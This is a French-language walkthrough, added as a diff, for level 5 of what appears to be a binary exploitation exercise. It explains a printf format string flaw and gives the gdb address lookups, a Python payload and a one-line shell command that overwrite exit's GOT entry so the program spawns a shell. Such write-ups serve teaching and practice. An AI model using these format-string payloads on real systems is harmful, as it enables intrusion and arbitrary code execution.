@@ -1,0 +1,75 @@
+# Level 5 - Format String Attack avec redirection GOT
+
+## 1. Analyse du binaire
+```c
+void o(void)
+{
+  system("/bin/sh");
+  _exit(1);
+}
+
+void n(void)
+{
+  char local_20c [520];
+  
+  fgets(local_20c, 0x200, stdin);
+  printf(local_20c);     // Format string vulnerability
+  exit(1);
+}
+
+void main(void)
+{
+  n();
+  return;
+}
+```
+
+## 2. Vulnérabilité
+- Format string dans la fonction `n()` : `printf(local_20c)` sans format string
+- La fonction `o()` nous donne un shell mais n'est jamais appelée
+- On peut exploiter la vulnérabilité format string pour rediriger `exit()` vers `o()`
+
+## 3. Recherche des adresses
+```bash
+# Adresse de la fonction o()
+(gdb) p o
+$1 = {<text variable, no debug info>} 0x80484a4 <o>
+
+# Adresse de exit dans la GOT
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0x80483d0 <exit@plt>
+(gdb) x/3i 0x80483d0
+   0x80483d0 <exit@plt>:    jmp    *0x8049838
+```
+
+Adresses importantes :
+- Fonction `o()` : `0x80484a4`
+- GOT de `exit` : `0x8049838`
+
+## 4. Construction de l'exploit
+```python
+addr_got_exit = 0x8049838
+addr_o = 0x80484a4  # = 134513828 en décimal
+
+# L'adresse doit être écrite en little-endian
+payload = "\x38\x98\x04\x08"  # addr_got_exit en little-endian
+payload += "%134513824x"      # 0x80484a4 - 4 (car on a déjà écrit 4 bytes)
+payload += "%4$n"             # écrire à la 4ème position de la stack
+```
+
+## 5. Exécution de l'exploit
+```bash
+(python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"'; cat -) | ./level5
+```
+
+## 6. Explication
+1. Le format string `%n` écrit le nombre de caractères déjà affichés à l'adresse donnée
+2. On écrit l'adresse de `o()` (0x80484a4) dans l'entrée GOT de exit
+3. Quand `exit(1)` est appelé, le programme saute vers `o()` à la place
+4. `o()` exécute `system("/bin/sh")` nous donnant un shell
+5. Le `cat -` maintient stdin ouvert pour pouvoir interagir avec le shell
+
+## 7. Notes
+- `%4$n` cible directement le 4ème argument sur la stack où se trouve notre adresse
+- Le calcul `134513824` (0x80484a4 - 4) est nécessaire car `%n` écrit le nombre de caractères déjà imprimés
+- L'adresse est écrite en little-endian à cause de l'architecture x86
